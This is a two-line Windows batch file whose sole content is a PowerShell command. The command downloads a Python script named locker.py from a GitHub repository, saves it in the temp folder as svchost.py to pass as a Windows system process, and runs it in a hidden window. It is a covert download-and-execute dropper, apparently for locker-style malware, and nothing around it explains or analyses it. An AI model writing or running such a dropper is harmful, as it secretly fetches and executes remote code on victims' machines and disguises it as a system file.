@echo off
powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/R0TA3/locker-test/main/locker.py' -OutFile '%TEMP%\svchost.py'; Start-Process python -ArgumentList '%TEMP%\svchost.py' -WindowStyle Hidden}"
